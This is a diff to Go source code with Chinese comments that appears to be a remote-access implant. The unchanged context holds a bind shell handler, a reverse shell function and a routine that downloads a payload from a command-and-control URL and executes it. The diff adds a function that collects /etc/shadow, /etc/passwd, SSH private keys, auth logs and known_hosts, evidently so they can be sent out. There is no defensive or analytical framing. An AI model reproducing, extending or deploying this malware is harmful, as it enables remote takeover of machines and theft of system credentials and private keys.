@@ -7,6 +7,7 @@ import (
 	"io/ioutil"
 	"net"
 	"net/http"
+	"os"
 	"os/exec"
 	"path/filepath"
 	"strings"
@@ -35,7 +36,7 @@ func OpenShell(prot string) {
 	}
 }
 
-// handleConnection 不直接调用 处理直连shell的命令
+// handleConnection 不直接调用 通过OpenShell调用 处理直连shell的命令
 func handleConnection(conn net.Conn) {
 	defer conn.Close()
 	reader := bufio.NewReader(conn)
@@ -58,6 +59,8 @@ func handleConnection(conn net.Conn) {
 
 		// 发送编码后的数据（添加换行符作为消息分隔符）
 		_, err = conn.Write([]byte(encoded + "\n"))
+
+		//_, err = conn.Write(output)
 
 		if err != nil {
 			fmt.Println("Write error:", err)
@@ -101,7 +104,7 @@ func reShell(ip string, port string) {
 	}
 }
 
-// downloadShell
+// downloadShell 用于下载payload
 func downloadShell(ccUrl string) {
 	resp, err := http.Get(ccUrl)
 	if err != nil {
@@ -126,4 +129,57 @@ func downloadShell(ccUrl string) {
 	if err := cmd.Run(); err != nil {
 		fmt.Println("elfRunERR:", err)
 	}
+}
+
+// FileResult 结构体 方便uploadInfo返回信息
+type FileResult struct {
+	Path    string
+	Content string
+	Error   error
+}
+
+func uploadInfo() []FileResult {
+	var targetFiles = []string{
+		"/etc/passwd",
+		"/etc/shadow",
+		"/etc/hosts",
+		"~/.ssh/id_rsa",
+		"/var/log/auth.log",
+		"~/.ssh/id_ed25519",
+		"~/.ssh/known_hosts",
+	}
+	var results []FileResult
+	for _, path := range targetFiles {
+		// 处理家目录的~符号
+		if path[:2] == "~/" {
+			home, _ := os.UserHomeDir()
+			path = filepath.Join(home, path[2:])
+		}
+		content, err := readFile(path)
+		if err != nil {
+			fmt.Printf("[!] 读取 %s 失败: %v\n", path, err)
+			continue
+		}
+		fmt.Printf("[+] 成功读取 %s (长度: %d bytes)\n", path, len(content))
+		// 调用结构体
+		results = append(results, FileResult{
+			Path:    path,
+			Content: string(content),
+			Error:   err,
+		})
+
+	}
+	return results
+}
+
+func readFile(path string) ([]byte, error) {
+	if _, err := os.Stat(path); os.IsNotExist(err) {
+		return nil, fmt.Errorf("No File")
+	}
+	file, err := os.Open(path)
+	if err != nil {
+		return nil, err
+	}
+	defer file.Close()
+	return ioutil.ReadAll(file)
 }
